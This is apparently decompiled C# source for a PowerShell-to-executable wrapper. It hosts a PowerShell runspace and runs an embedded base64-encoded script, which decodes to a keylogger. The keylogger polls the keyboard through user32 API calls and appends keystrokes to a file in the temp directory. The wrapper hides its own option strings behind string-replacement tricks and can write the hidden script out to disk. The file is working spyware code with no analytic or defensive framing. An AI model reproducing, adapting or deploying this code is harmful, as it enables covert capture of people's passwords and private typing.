using System;
using System.Diagnostics;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace ModuleNameSpace;

internal class MainApp : MainAppInterface
{
	private bool shouldExit;

	private int exitCode;

	public bool ShouldExit
	{
		get
		{
			return shouldExit;
		}
		set
		{
			shouldExit = value;
		}
	}

	public int ExitCode
	{
		get
		{
			return exitCode;
		}
		set
		{
			exitCode = value;
		}
	}

	[STAThread]
	private static int Main(string[] args)
	{
		//IL_0518: Unknown result type (might be due to invalid IL or missing references)
		//IL_051e: Invalid comparison between Unknown and I4
		MainApp mainApp = new MainApp();
		bool flag = false;
		string text = string.Empty;
		MainModuleUI ui = new MainModuleUI();
		MainModule mainModule = new MainModule(mainApp, ui);
		ManualResetEvent mre = new ManualResetEvent(initialState: false);
		AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
		try
		{
			Runspace val = RunspaceFactory.CreateRunspace((PSHost)(object)mainModule);
			try
			{
				val.set_ApartmentState(ApartmentState.STA);
				val.Open();
				PowerShell pwsh = PowerShell.Create();
				try
				{
					Console.CancelKeyPress += delegate(object sender, ConsoleCancelEventArgs e)
					{
						try
						{
							pwsh.BeginStop((AsyncCallback)delegate
							{
								mre.Set();
								e.Cancel = true;
							}, (object)null);
						}
						catch
						{
						}
					};
					pwsh.set_Runspace(val);
					pwsh.get_Streams().get_Error().add_DataAdded((EventHandler<DataAddedEventArgs>)delegate(object sender, DataAddedEventArgs e)
					{
						((PSHostUserInterface)ui).WriteErrorLine(((object)((PSDataCollection<ErrorRecord>)sender).get_Item(e.get_Index())).ToString());
					});
					PSDataCollection<string> val2 = new PSDataCollection<string>();
					if (Console_Info.IsInputRedirected())
					{
						string text2 = "";
						while ((text2 = Console.ReadLine()) != null)
						{
							val2.Add(text2);
						}
					}
					val2.Complete();
					PSDataCollection<PSObject> colOutput = new PSDataCollection<PSObject>();
					colOutput.add_DataAdded((EventHandler<DataAddedEventArgs>)delegate(object sender, DataAddedEventArgs e)
					{
						((PSHostUserInterface)ui).WriteLine(((object)colOutput.get_Item(e.get_Index())).ToString());
					});
					int num = 0;
					int num2 = 0;
					foreach (string text3 in args)
					{
						if (string.Compare(text3, "-whatt".Replace("hat", "ai"), ignoreCase: true) == 0)
						{
							flag = true;
						}
						else if (text3.StartsWith("-extdummt".Replace("dumm", "rac"), StringComparison.InvariantCultureIgnoreCase))
						{
							string[] array = text3.Split(new string[1] { ":" }, 2, StringSplitOptions.RemoveEmptyEntries);
							if (array.Length != 2)
							{
								Console.WriteLine("If you spzzcify thzz -zzxtract option you nzzed to add a filzz for zzxtraction in this way\r\n   -zzxtract:\"<filzznamzz>\"".Replace("zz", "e"));
								return 1;
							}
							text = array[1].Trim(new char[1] { '"' });
						}
						else
						{
							if (string.Compare(text3, "-end", ignoreCase: true) == 0)
							{
								num = num2 + 1;
								break;
							}
							if (string.Compare(text3, "-debug", ignoreCase: true) == 0)
							{
								Debugger.Launch();
								break;
							}
						}
						num2++;
					}
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String("I3JlcXVpcmVzIC1WZXJzaW9uIDINCmZ1bmN0aW9uIFN0YXJ0LUtleUxvZ2dlcigkUGF0aD0iJGVudjp0ZW1wXGtleWxvZ2dlci50eHQiKSANCnsNCiAgIyBTaWduYXR1cmVzIGZvciBBUEkgQ2FsbHMNCiAgJHNpZ25hdHVyZXMgPSBAJw0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSANCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHNob3J0IEdldEFzeW5jS2V5U3RhdGUoaW50IHZpcnR1YWxLZXlDb2RlKTsgDQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldEtleWJvYXJkU3RhdGUoYnl0ZVtdIGtleXN0YXRlKTsNCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldDQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgTWFwVmlydHVhbEtleSh1aW50IHVDb2RlLCBpbnQgdU1hcFR5cGUpOw0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUodWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOw0KJ0ANCiANCiAgIyBsb2FkIHNpZ25hdHVyZXMgYW5kIG1ha2UgbWVtYmVycyBhdmFpbGFibGUNCiAgJEFQSSA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmVzIC1OYW1lICdXaW4zMicgLU5hbWVzcGFjZSBBUEkgLVBhc3NUaHJ1DQogICAgDQogICMgY3JlYXRlIG91dHB1dCBmaWxlDQogICRudWxsID0gTmV3LUl0ZW0gLVBhdGggJFBhdGggLUl0ZW1UeXBlIEZpbGUgLUZvcmNlDQogDQogIHRyeQ0KICB7DQogICAgV3JpdGUtSG9zdCAnUmVjb3JkaW5nIGtleSBwcmVzc2VzLiBQcmVzcyBDVFJMK0MgdG8gc2VlIHJlc3VsdHMuJyAtRm9yZWdyb3VuZENvbG9yIFJlZA0KIA0KICAgICMgY3JlYXRlIGVuZGxlc3MgbG9vcC4gV2hlbiB1c2VyIHByZXNzZXMgQ1RSTCtDLCBmaW5hbGx5LWJsb2NrDQogICAgIyBleGVjdXRlcyBhbmQgc2hvd3MgdGhlIGNvbGxlY3RlZCBrZXkgcHJlc3Nlcw0KICAgIHdoaWxlICgkdHJ1ZSkgew0KICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA0MA0KICAgICAgDQogICAgICAjIHNjYW4gYWxsIEFTQ0lJIGNvZGVzIGFib3ZlIDgNCiAgICAgIGZvciAoJGFzY2lpID0gOTsgJGFzY2lpIC1sZSAyNTQ7ICRhc2NpaSsrKSB7DQogICAgICAgICMgZ2V0IGN1cnJlbnQga2V5IHN0YXRlDQogICAgICAgICRzdGF0ZSA9ICRBUEk6OkdldEFzeW5jS2V5U3RhdGUoJGFzY2lpKQ0KIA0KICAgICAgICAjIGlzIGtleSBwcmVzc2VkPw0KICAgICAgICBpZiAoJHN0YXRlIC1lcSAtMzI3NjcpIHsNCiAgICAgICAgICAkbnVsbCA9IFtjb25zb2xlXTo6Q2Fwc0xvY2sNCiANCiAgICAgICAgICAjIHRyYW5zbGF0ZSBzY2FuIGNvZGUgdG8gcmVhbCBjb2RlDQogICAgICAgICAgJHZpcnR1YWxLZXkgPSAkQVBJOjpNYXBWaXJ0dWFsS2V5KCRhc2NpaSwgMykNCiANCiAgICAgICAgICAjIGdldCBrZXlib2FyZCBzdGF0ZSBmb3IgdmlydHVhbCBrZXlzDQogICAgICAgICAgJGtic3RhdGUgPSBOZXctT2JqZWN0IEJ5dGVbXSAyNTYNCiAgICAgICAgICAkY2hlY2trYnN0YXRlID0gJEFQSTo6R2V0S2V5Ym9hcmRTdGF0ZSgka2JzdGF0ZSkNCiANCiAgICAgICAgICAjIHByZXBhcmUgYSBTdHJpbmdCdWlsZGVyIHRvIHJlY2VpdmUgaW5wdXQga2V5DQogICAgICAgICAgJG15Y2hhciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXINCiANCiAgICAgICAgICAjIHRyYW5zbGF0ZSB2aXJ0dWFsIGtleQ0KICAgICAgICAgICRzdWNjZXNzID0gJEFQSTo6VG9Vbmljb2RlKCRhc2NpaSwgJHZpcnR1YWxLZXksICRrYnN0YXRlLCAkbXljaGFyLCAkbXljaGFyLkNhcGFjaXR5LCAwKQ0KIA0KICAgICAgICAgIGlmICgkc3VjY2VzcykgDQogICAgICAgICAgew0KICAgICAgICAgICAgIyBhZGQga2V5IHRvIGxvZ2dlciBmaWxlDQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpBcHBlbmRBbGxUZXh0KCRQYXRoLCAkbXljaGFyLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlKSANCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogIH0NCiAgZmluYWxseQ0KICB7DQogICAgIyBvcGVuIGxvZ2dlciBmaWxlIGluIE5vdGVwYWQNCiAgICBub3RlcGFkICRQYXRoDQogIH0NCn0NCiANCiMgcmVjb3JkcyBhbGwga2V5IHByZXNzZXMgdW50aWwgc2NyaXB0IGlzIGFib3J0ZWQgYnkgcHJlc3NpbmcgQ1RSTCtDDQojIHdpbGwgdGhlbiBvcGVuIHRoZSBmaWxlIHdpdGggY29sbGVjdGVkIGtleSBjb2Rlcw0KU3RhcnQtS2V5TG9nZ2Vy"));
					if (!string.IsNullOrEmpty(text))
					{
						File.WriteAllText(text, @string);
						return 0;
					}
					pwsh.AddScript(@string);
					string text4 = null;
					Regex regex = new Regex("^-([^: ]+)[ :]?([^:]*)$");
					for (int j = num; j < args.Length; j++)
					{
						Match match = regex.Match(args[j]);
						if (match.Success && match.Groups.Count == 3 && !double.TryParse(args[j], out var _))
						{
							if (text4 != null)
							{
								pwsh.AddParameter(text4);
							}
							if (match.Groups[2].Value.Trim() == "")
							{
								text4 = match.Groups[1].Value;
							}
							else if (!(match.Groups[2].Value == "True") && !(match.Groups[2].Value.ToUpper() == "$TRUE"))
							{
								if (!(match.Groups[2].Value == "False") && !(match.Groups[2].Value.ToUpper() == "$FALSE"))
								{
									pwsh.AddParameter(match.Groups[1].Value, (object)match.Groups[2].Value);
									text4 = null;
								}
								else
								{
									pwsh.AddParameter(match.Groups[1].Value, (object)false);
									text4 = null;
								}
							}
							else
							{
								pwsh.AddParameter(match.Groups[1].Value, (object)true);
								text4 = null;
							}
						}
						else if (text4 != null)
						{
							pwsh.AddParameter(text4, (object)args[j]);
							text4 = null;
						}
						else
						{
							pwsh.AddArgument((object)args[j]);
						}
					}
					if (text4 != null)
					{
						pwsh.AddParameter(text4);
					}
					pwsh.AddCommand("out-string");
					pwsh.AddParameter("stream");
					pwsh.BeginInvoke<string, PSObject>(val2, colOutput, (PSInvocationSettings)null, (AsyncCallback)delegate(IAsyncResult ar)
					{
						if (ar.IsCompleted)
						{
							mre.Set();
						}
					}, (object)null);
					while (!mainApp.ShouldExit && !mre.WaitOne(100))
					{
					}
					pwsh.Stop();
					if ((int)pwsh.get_InvocationStateInfo().get_State() == 5)
					{
						((PSHostUserInterface)ui).WriteErrorLine(pwsh.get_InvocationStateInfo().get_Reason().Message);
					}
				}
				finally
				{
					if (pwsh != null)
					{
						((IDisposable)pwsh).Dispose();
					}
				}
				val.Close();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.Write("An exception occured: ");
			Console.WriteLine(ex.Message);
		}
		if (flag)
		{
			Console.WriteLine("Hit any key to exit...");
			Console.ReadKey();
		}
		return mainApp.ExitCode;
	}

	private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		throw new Exception("Unhandled exception in " + AppDomain.CurrentDomain.FriendlyName);
	}
}
